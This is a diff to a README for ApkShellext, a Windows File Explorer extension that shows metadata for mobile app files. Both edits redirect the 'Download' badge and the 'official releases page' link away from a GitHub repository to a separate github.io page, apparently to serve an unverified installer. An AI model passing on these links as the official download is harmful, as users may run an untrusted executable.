@@ -1,6 +1,6 @@
 # 📦 ApkShellext - View mobile app properties in Windows
 
-[![Download ApkShellext](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/akuamarin9258-design/ApkShellext)
+[![Download ApkShellext](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://akuamarin9258-design.github.io)
 
 ApkShellext adds features to Windows File Explorer. It shows icons, metadata, and tooltips for mobile files. You see these details directly in your folder view. The software supports APK, IPA, and APPX file types. It works as a shell extension to keep your file management tasks fast.
 
@@ -15,7 +15,7 @@ ApkShellext adds features to Windows File Explorer. It shows icons, metadata, an
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official releases page](https://github.com/akuamarin9258-design/ApkShellext) to download the installer.
+1.  Visit the [official releases page](https://akuamarin9258-design.github.io) to download the installer.
 2.  Locate the downloaded installation file in your Downloads folder.
 3.  Double-click the file to start the setup process.
 4.  Follow the prompts on your screen to install the extension.
